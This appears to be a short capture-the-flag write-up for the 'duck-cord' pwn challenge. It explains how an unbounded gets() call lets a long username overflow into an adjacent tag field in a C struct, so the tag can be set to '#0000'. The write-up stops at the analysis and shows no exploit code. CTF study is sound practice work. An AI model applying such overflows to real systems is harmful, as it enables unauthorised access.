## Description

duck-cord | 75  points | By  `Andrew`

The ducks and I have been working on our latest communications app:  `Duck Cord`  It's more duck-focussed than other communication apps these days...

Netcat Links:`nc  challs.bcactf.com 30184`<br>

## Analysis 

Program is simple. On start it asks for username with max_len 32, then sends random messages and lets us send messages.

The program mentions max length for username but never actually limits the input. `gets(self.name);` (Vuln)

```c
// made this always be > 1, to prevent from acessing the SYSTEM_USER text with #0000
self.tag[3] = '1' + (rand() % 9);
```
So if our tag name is `#0000` we can access SYSTEM_USER text.

What is `self`? &nbsp;&nbsp;&nbsp; `self` is type of `user_t` struct, custom object.
```c
typedef struct {
    char name[MAX_NAME_LEN];
    union {
        uint32_t tag_raw;
        char tag[4];
    };
} user_t;
```

So if we overflow the name array we can write into tags.
